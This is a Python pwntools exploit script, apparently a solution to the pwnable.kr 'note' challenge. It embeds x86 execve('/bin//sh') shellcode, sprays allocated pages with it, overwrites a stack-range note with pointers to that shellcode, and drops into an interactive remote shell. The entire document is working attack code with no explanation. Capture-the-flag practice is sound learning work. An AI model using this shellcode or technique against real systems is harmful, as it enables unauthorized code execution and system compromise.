from pwn import *

STACK = (0xfffdd000, 0xffffe000)
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE += ('\x00' * (4-(len(SHELLCODE)%4)))
PAGE_SIZE = 4096
PAYLOAD = SHELLCODE * (PAGE_SIZE / len(SHELLCODE) - 1)

is_running = True
while is_running:
        p = remote('pwnable.kr', 9019)
        prev_addr = 0
        try:
                while True:
                        p.sendlineafter('5. exit', '1')
                        p.recvuntil('no ')
                        note_no = int(p.recvuntil('\n')[:-1])
                        p.recvuntil('[')
                        allocated_addr = int(p.recvuntil(']')[:-1], 16)
                        print note_no, ": ", hex(allocated_addr)
                        if allocated_addr in range(STACK[0], STACK[1]):
                                p.sendlineafter('5. exit', '2')
                                p.sendlineafter('note no?', str(note_no))
                                p.sendlineafter('(MAX : 4096 byte)', p32(prev_addr)*1024)
                                p.sendlineafter('5. exit', '5')
                                is_running = False
                                break
                        else:
                                prev_addr = allocated_addr
                                p.sendlineafter('5. exit', '2')
                                p.sendlineafter('note no?', str(note_no))
                                p.sendlineafter('(MAX : 4096 byte)', PAYLOAD)

                        if note_no == 255:
                                print "Cleaning..."
                                for i in range(256):
                                        p.sendlineafter('5. exit', '4')
                                        p.sendlineafter('note no?', str(i))
        except:
                p.close()
p.interactive()
